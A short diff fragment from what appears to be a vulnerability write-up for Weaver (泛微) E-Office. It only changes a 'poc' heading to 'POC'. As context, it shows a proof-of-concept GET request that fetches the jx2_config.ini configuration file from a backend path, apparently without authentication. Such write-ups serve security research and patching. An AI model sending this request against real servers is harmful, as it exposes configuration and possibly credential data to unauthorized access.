@@ -6,7 +6,7 @@ app="泛微-EOffice"
 ```
 
 
-## poc
+## POC
 ```
 GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
 Host: xx.xx.xx.xx
